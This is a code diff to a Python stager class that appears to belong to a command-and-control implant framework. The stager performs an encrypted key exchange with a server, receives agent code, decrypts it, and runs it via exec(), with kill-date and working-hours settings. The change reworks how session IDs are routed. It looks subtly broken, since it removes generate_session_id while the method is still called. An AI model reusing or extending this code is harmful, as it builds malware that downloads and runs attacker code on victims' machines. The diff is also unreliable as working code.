@@ -33,14 +33,11 @@ class Stage:
         if self.server.startswith("https"):
             hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None
 
+        self.session_id = b'00000000'
         self.session_id = self.generate_session_id()
         self.key = None
         self.headers = self.initialize_headers(self.profile)
         self.packet_handler = ExtendedPacketHandler(None, staging_key=self.staging_key, session_id=self.session_id, headers=self.headers, server=self.server, taskURIs=self.taskURIs)
-
-    @staticmethod
-    def generate_session_id():
-        return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
 
     def initialize_headers(self, profile):
         parts = profile.split('|')
@@ -76,8 +73,12 @@ class Stage:
         self.packet_handler.receive_queue.Dequeue()
 
         # Decrypt Server Response
-        packet = aes_decrypt_and_verify(self.staging_key, response)
-        nonce, server_pub = packet[0:16], int(packet[16:])
+        packet = self.packet_handler.parse_routing_packet(self.staging_key, response)
+        self.session_id = list(packet.keys())[0]
+        self.packet_handler.session_id = self.session_id
+        encdata = packet[self.session_id][3]
+        data = aes_decrypt_and_verify(self.staging_key, encdata)
+        nonce, server_pub = data[0:16], int(data[16:])
 
         # Generate Shared Secret
         client_pub.genKey(server_pub)
@@ -99,7 +100,8 @@ class Stage:
         self.packet_handler.receive_queue.Dequeue()
 
         # Decrypt and Execute Agent
-        agent_code = aes_decrypt_and_verify(self.key, response)
+        packet = self.packet_handler.parse_routing_packet(self.staging_key, response)
+        agent_code = aes_decrypt_and_verify(self.key, packet[self.session_id][3])
         exec(agent_code, globals())
         agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server, session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
         self.packet_handler.agent = agent
